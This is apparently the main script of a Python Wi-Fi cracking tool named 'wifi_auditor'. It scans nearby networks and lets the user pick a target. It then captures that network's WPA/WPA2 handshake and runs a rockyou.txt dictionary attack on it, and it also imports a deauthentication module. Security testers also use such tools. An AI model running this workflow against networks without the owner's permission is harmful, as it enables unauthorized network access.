# === wifi_auditor/main.py ===

# Importing required modules from the project
from scanner import scan_networks                # Scans for nearby Wi-Fi networks
from handshake_capture import capture_handshake  # Captures WPA/WPA2 handshakes
from deauth_attack import deauth_target          # (Not used here, but likely for forcing reconnection)
from cracker import crack_handshake              # Attempts to crack the captured handshake using a wordlist


def main():
    # Define the wireless interface in monitor mode (must be enabled before running this script)
    interface = "wlan0mon"

    print("[+] Scanning Wi-Fi networks...")
    networks = scan_networks(interface)  # Retrieve a list of available Wi-Fi networks

    # If no networks are found, exit early
    if not networks:
        print("[-] No networks found.")
        return

    # Present the user with a list of scanned networks to choose from
    print("\n[+] Select target network:")
    for idx, net in enumerate(networks):
        print(f"{idx}. SSID: {net['ssid']}, BSSID: {net['bssid']}, Channel: {net['channel']}")

    # Prompt user to select a network based on index
    choice = int(input("Enter the number of the target network: "))
    target = networks[choice]

    print(f"[+] Target selected: {target['ssid']} ({target['bssid']})")

    # Step 1: Capture WPA/WPA2 handshake from the target access point
    capture_handshake(interface, target['bssid'])

    # Step 2: Attempt to crack the captured handshake using a dictionary file
    crack_handshake(target['bssid'], "captures/handshake.pcap", "wordlists/rockyou.txt")


# Ensure main() is only executed if this script is run directly
if __name__ == "__main__":
    main()
